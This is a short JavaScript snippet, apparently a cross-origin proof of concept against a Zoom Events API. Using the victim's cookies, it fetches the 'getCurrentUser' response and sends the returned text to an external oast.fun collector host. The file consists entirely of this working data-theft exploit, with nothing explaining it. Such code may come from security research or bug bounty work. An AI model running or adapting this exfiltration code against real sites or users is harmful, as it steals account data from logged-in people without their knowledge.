var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch(('https://cg31y2g2vtc0000yj8x0gjtcr4eyyyyyn.oast.fun/?xxx='+this.responseText))
};
